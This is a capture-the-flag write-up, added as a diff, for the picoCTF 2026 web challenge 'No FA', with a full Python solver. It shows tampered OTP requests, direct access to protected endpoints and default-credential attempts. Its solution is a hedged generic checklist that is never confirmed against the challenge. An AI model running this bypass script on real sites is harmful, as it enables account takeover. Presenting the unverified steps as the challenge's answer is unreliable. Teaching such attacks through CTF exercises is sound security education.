@@ -1,0 +1,509 @@
+---
+title: "No FA — picoCTF 2026"
+date: 2026-06-26
+author: "Ian Mattas"
+slug: "picoctf-2026-no-fa"
+order: 67
+writeupKind: "challenge"
+ctfSlug: "picoctf-2026"
+ctfTitle: "picoCTF 2026"
+---
+
+# No FA — picoCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 200  
+> **Author:** Imattas aka Zemi
+
+---
+
+## Challenge Description
+
+> Seems like some data has been leaked! Can you get the flag? (Likely involves bypassing or exploiting a broken 2FA/authentication mechanism)
+
+---
+
+## Recon / Initial Analysis
+
+The challenge name "No FA" is a play on "No 2FA" (no two-factor authentication), hinting that the application's multi-factor authentication mechanism is either missing, broken, or bypassable. This is a classic web exploitation pattern seen in many CTF challenges.
+
+The starting point is to access the application, observe its flow, register/login normally, and reach the 2FA/OTP verification page so the request can be intercepted and tampered with.
+
+---
+
+## Vulnerability / Observation
+
+The core vulnerability in challenges like this typically falls into one of these categories:
+
+1. **Missing server-side OTP validation**: The application presents a 2FA/OTP form to the user but never actually validates the submitted value on the server side. Removing or blanking the OTP parameter causes the server to skip validation entirely.
+
+2. **Client-side only enforcement**: The 2FA page exists purely as a client-side gate. The actual flag/data endpoint does not check whether 2FA was completed -- you can navigate directly to the protected resource.
+
+3. **Parameter tampering**: The OTP field can be removed from the POST request altogether, and the server accepts the request without it because it only checks `if otp_param: validate(otp)` rather than requiring the field's presence.
+
+4. **Leaked credentials/data in source**: Given the description mentions "data has been leaked," the flag or authentication tokens may be visible in:
+   - HTML source comments
+   - JavaScript files
+   - API responses
+   - HTTP headers
+   - Cookies
+
+5. **Predictable/static OTP**: The OTP might be hardcoded, always "000000", or derivable from public information.
+
+The most effective approach is to:
+1. Register/login to the application normally
+2. When presented with the 2FA/OTP page, intercept the request
+3. Remove or modify the OTP parameter
+4. Observe the server response -- it may return the flag directly
+5. Also check page source, cookies, and response headers for leaked data
+
+---
+
+## Exploitation / Solution
+
+### Step 1: Access the application
+Navigate to the challenge URL in your browser and observe the application flow.
+
+### Step 2: Register or login
+If the application has a registration form, create an account with any credentials. The registration typically accepts anything.
+
+```
+Username: test
+Password: test123
+```
+
+### Step 3: Reach the 2FA page
+After login/registration, you should be redirected to a 2FA/OTP verification page.
+
+### Step 4: Intercept the request with Burp Suite (or similar proxy)
+1. Configure your browser to use Burp Suite as a proxy
+2. Enter any value in the OTP field and click submit
+3. Intercept the POST request in Burp Suite
+
+The request might look like:
+```http
+POST /verify-2fa HTTP/1.1
+Host: challenge-url.picoctf.org
+Content-Type: application/x-www-form-urlencoded
+
+otp=123456
+```
+
+### Step 5: Bypass the OTP
+**Method A -- Remove the OTP parameter entirely:**
+```http
+POST /verify-2fa HTTP/1.1
+Host: challenge-url.picoctf.org
+Content-Type: application/x-www-form-urlencoded
+
+```
+(Empty body, or remove just the `otp=` value)
+
+**Method B -- Send an empty OTP value:**
+```http
+POST /verify-2fa HTTP/1.1
+Host: challenge-url.picoctf.org
+Content-Type: application/x-www-form-urlencoded
+
+otp=
+```
+
+**Method C -- Change Content-Type to JSON:**
+```http
+POST /verify-2fa HTTP/1.1
+Host: challenge-url.picoctf.org
+Content-Type: application/json
+Accept: application/json
+
+{}
+```
+
+**Method D -- Navigate directly to the flag endpoint:**
+Try accessing common endpoints directly without going through 2FA:
+```
+/flag
+/dashboard
+/home
+/secret
+/api/flag
+```
+
+### Step 6: Check for leaked data
+Inspect the page source, JavaScript files, and network responses for any leaked information:
+```bash
+curl -s <challenge_url> | grep -i "picoCTF\|flag\|secret\|password\|token"
+```
+
+### Step 7: Retrieve the flag
+The server response after a successful bypass should contain the flag:
+```
+picoCTF{...}
+```
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+"""
+No FA - picoCTF 2026
+Category: Web Exploitation | Points: 200
+
+Bypasses broken 2FA/OTP authentication to retrieve the flag.
+Tries multiple bypass techniques: parameter removal, empty values,
+content-type manipulation, and direct endpoint access.
+
+Usage:
+    python3 solve.py <challenge_url>
+    python3 solve.py http://challenge.picoctf.org:12345
+"""
+
+import requests
+import sys
+import re
+from urllib.parse import urljoin
+
+# ──────────────────────────────────────────────────────────────────
+# Configuration
+# ──────────────────────────────────────────────────────────────────
+FLAG_PATTERN = re.compile(r"picoCTF\{[^}]+\}")
+
+# Default credentials to try for registration/login
+DEFAULT_CREDS = [
+    {"username": "admin", "password": "admin"},
+    {"username": "test", "password": "test"},
+    {"username": "user", "password": "password"},
+    {"username": "a", "password": "a"},
+]
+
+
+def find_flag(text):
+    """Search text for the flag pattern."""
+    if not text:
+        return []
+    return FLAG_PATTERN.findall(text)
+
+
+def check_response(resp, context=""):
+    """Check a response for flags and interesting information."""
+    flags = find_flag(resp.text)
+    if flags:
+        print(f"[+] FLAG FOUND ({context}): {flags[0]}")
+        return flags
+    # Check headers too
+    for header, value in resp.headers.items():
+        hflags = find_flag(value)
+        if hflags:
+            print(f"[+] FLAG FOUND in header {header}: {hflags[0]}")
+            return hflags
+    # Check cookies
+    for cookie_name, cookie_val in resp.cookies.items():
+        cflags = find_flag(cookie_val)
+        if cflags:
+            print(f"[+] FLAG FOUND in cookie {cookie_name}: {cflags[0]}")
+            return cflags
+    return []
+
+
+def try_register(session, base_url, creds):
+    """Attempt to register with the given credentials."""
+    register_paths = ["/register", "/signup", "/create-account", "/api/register"]
+    for path in register_paths:
+        url = urljoin(base_url, path)
+        try:
+            resp = session.post(url, data=creds, allow_redirects=True, timeout=10)
+            if resp.status_code in [200, 201, 302]:
+                print(f"    [+] Registration successful via {path}")
+                flags = check_response(resp, f"register {path}")
+                if flags:
+                    return flags
+                return True
+        except requests.exceptions.RequestException:
+            continue
+    return None
+
+
+def try_login(session, base_url, creds):
+    """Attempt to login with the given credentials."""
+    login_paths = ["/login", "/signin", "/auth", "/api/login"]
+    for path in login_paths:
+        url = urljoin(base_url, path)
+        try:
+            resp = session.post(url, data=creds, allow_redirects=True, timeout=10)
+            if resp.status_code in [200, 302]:
+                flags = check_response(resp, f"login {path}")
+                if flags:
+                    return flags
+                return True
+        except requests.exceptions.RequestException:
+            continue
+    return None
+
+
+def bypass_2fa(session, base_url):
+    """
+    Core exploit: Try multiple techniques to bypass 2FA/OTP verification.
+    """
+    verify_paths = [
+        "/verify-2fa", "/verify", "/2fa", "/otp", "/verify-otp",
+        "/mfa", "/verify-mfa", "/api/verify", "/api/2fa",
+        "/check-otp", "/validate-otp",
+    ]
+
+    all_flags = []
+
+    for path in verify_paths:
+        url = urljoin(base_url, path)
+        print(f"\n[*] Trying 2FA bypass on {path}...")
+
+        # ── Method 1: Remove OTP parameter entirely (empty body) ──
+        print("    Method 1: Empty POST body...")
+        try:
+            resp = session.post(url, data="", timeout=10, allow_redirects=True)
+            flags = check_response(resp, "empty body")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 2: Send empty OTP value ──
+        print("    Method 2: Empty OTP value...")
+        try:
+            resp = session.post(url, data={"otp": ""}, timeout=10, allow_redirects=True)
+            flags = check_response(resp, "empty otp")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 3: Remove the OTP key, send other params ──
+        print("    Method 3: POST without OTP key...")
+        try:
+            resp = session.post(url, data={"bypass": "true"}, timeout=10, allow_redirects=True)
+            flags = check_response(resp, "no otp key")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 4: JSON content type with empty object ──
+        print("    Method 4: JSON content type with empty object...")
+        try:
+            resp = session.post(
+                url,
+                json={},
+                headers={"Accept": "application/json"},
+                timeout=10,
+                allow_redirects=True,
+            )
+            flags = check_response(resp, "json empty")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 5: JSON with null OTP ──
+        print("    Method 5: JSON with null OTP...")
+        try:
+            resp = session.post(
+                url,
+                json={"otp": None},
+                headers={"Accept": "application/json"},
+                timeout=10,
+                allow_redirects=True,
+            )
+            flags = check_response(resp, "json null otp")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 6: OTP = 0 ──
+        print("    Method 6: OTP = 0...")
+        try:
+            resp = session.post(url, data={"otp": "0"}, timeout=10, allow_redirects=True)
+            flags = check_response(resp, "otp=0")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+        # ── Method 7: GET request instead of POST ──
+        print("    Method 7: GET request...")
+        try:
+            resp = session.get(url, timeout=10, allow_redirects=True)
+            flags = check_response(resp, "GET request")
+            if flags:
+                all_flags.extend(flags)
+                continue
+        except requests.exceptions.RequestException:
+            pass
+
+    return all_flags
+
+
+def check_direct_endpoints(session, base_url):
+    """Try to access protected endpoints directly, bypassing 2FA entirely."""
+    print("\n[*] Checking direct endpoint access (skip 2FA)...")
+    endpoints = [
+        "/flag", "/dashboard", "/home", "/secret", "/admin",
+        "/api/flag", "/api/secret", "/api/data", "/api/user",
+        "/profile", "/account", "/protected", "/private",
+    ]
+    all_flags = []
+    for ep in endpoints:
+        url = urljoin(base_url, ep)
+        try:
+            resp = session.get(url, timeout=10, allow_redirects=True)
+            flags = check_response(resp, f"direct {ep}")
+            if flags:
+                all_flags.extend(flags)
+        except requests.exceptions.RequestException:
+            continue
+    return all_flags
+
+
+def check_page_source(session, base_url):
+    """Check the main page and common pages for leaked data in source."""
+    print("\n[*] Checking page sources for leaked data...")
+    pages = ["/", "/login", "/register", "/index.html"]
+    all_flags = []
+    for page in pages:
+        url = urljoin(base_url, page)
+        try:
+            resp = session.get(url, timeout=10)
+            flags = check_response(resp, f"source {page}")
+            if flags:
+                all_flags.extend(flags)
+            # Also check for comments, hidden fields, scripts
+            if "<!--" in resp.text:
+                comments = re.findall(r"<!--(.*?)-->", resp.text, re.DOTALL)
+                for comment in comments:
+                    m = find_flag(comment)
+                    if m:
+                        print(f"[+] FLAG in HTML comment on {page}: {m[0]}")
+                        all_flags.extend(m)
+            # Check linked JS files
+            js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text)
+            for js in js_files:
+                js_url = urljoin(url, js)
+                try:
+                    js_resp = session.get(js_url, timeout=10)
+                    m = find_flag(js_resp.text)
+                    if m:
+                        print(f"[+] FLAG in JS file {js}: {m[0]}")
+                        all_flags.extend(m)
+                except requests.exceptions.RequestException:
+                    continue
+        except requests.exceptions.RequestException:
+            continue
+    return all_flags
+
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 solve.py <challenge_url>")
+        print("Example: python3 solve.py http://challenge.picoctf.org:12345")
+        sys.exit(1)
+
+    base_url = sys.argv[1].rstrip("/")
+    print(f"[*] Target: {base_url}")
+    print("=" * 60)
+
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    })
+
+    all_flags = []
+
+    # ── Phase 1: Check page sources for leaked data ──
+    flags = check_page_source(session, base_url)
+    all_flags.extend(flags)
+
+    # ── Phase 2: Register / Login ──
+    print("\n[*] Attempting registration and login...")
+    authenticated = False
+    for creds in DEFAULT_CREDS:
+        print(f"    Trying creds: {creds['username']}:{creds['password']}")
+
+        # Try register first
+        result = try_register(session, base_url, creds)
+        if isinstance(result, list):
+            all_flags.extend(result)
+            break
+        if result:
+            authenticated = True
+            break
+
+        # Try login
+        result = try_login(session, base_url, creds)
+        if isinstance(result, list):
+            all_flags.extend(result)
+            break
+        if result:
+            authenticated = True
+            break
+
+    # ── Phase 3: Bypass 2FA ──
+    if authenticated or not all_flags:
+        flags = bypass_2fa(session, base_url)
+        all_flags.extend(flags)
+
+    # ── Phase 4: Check direct endpoints ──
+    if not all_flags:
+        flags = check_direct_endpoints(session, base_url)
+        all_flags.extend(flags)
+
+    # ── Results ──
+    print("\n" + "=" * 60)
+    print("RESULTS")
+    print("=" * 60)
+    unique_flags = list(set(all_flags))
+    if unique_flags:
+        for flag in unique_flags:
+            print(f"[+] FLAG: {flag}")
+    else:
+        print("[-] No flag found automatically.")
+        print()
+        print("Manual investigation steps:")
+        print("  1. Open the challenge URL in a browser")
+        print("  2. Register with any credentials")
+        print("  3. Use Burp Suite to intercept the 2FA/OTP request")
+        print("  4. Try removing the OTP parameter from the request body")
+        print("  5. Try sending an empty OTP value")
+        print("  6. Try changing Content-Type to application/json with {}")
+        print("  7. Check page source for hidden comments or leaked data")
+        print("  8. Check /robots.txt, /.git/, /sitemap.xml for info leaks")
+        print("  9. Inspect cookies and response headers for flag data")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- A 2FA gate is only as strong as its server-side validation: if the OTP is checked with `if otp_param:` rather than being required, dropping the parameter skips verification.
+- Always test the protected endpoint directly — client-side-only enforcement means `/flag`, `/dashboard`, etc. may be reachable without completing 2FA.
+- Parameter tampering variants worth trying: empty body, empty value, missing key, JSON `{}`, JSON `null`, and switching the HTTP method.
+- "Data has been leaked" is a strong hint to inspect HTML comments, linked JS files, response headers, and cookies for the flag.
+- Burp Suite (or any intercepting proxy) is the core tool for editing and replaying the verification request.
+
+---
+
+## References
+
+- [OWASP: Testing Multi-Factor Authentication](https://owasp.org/www-project-web-security-testing-guide/)
+- [PortSwigger Burp Suite documentation](https://portswigger.net/burp/documentation)
+- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
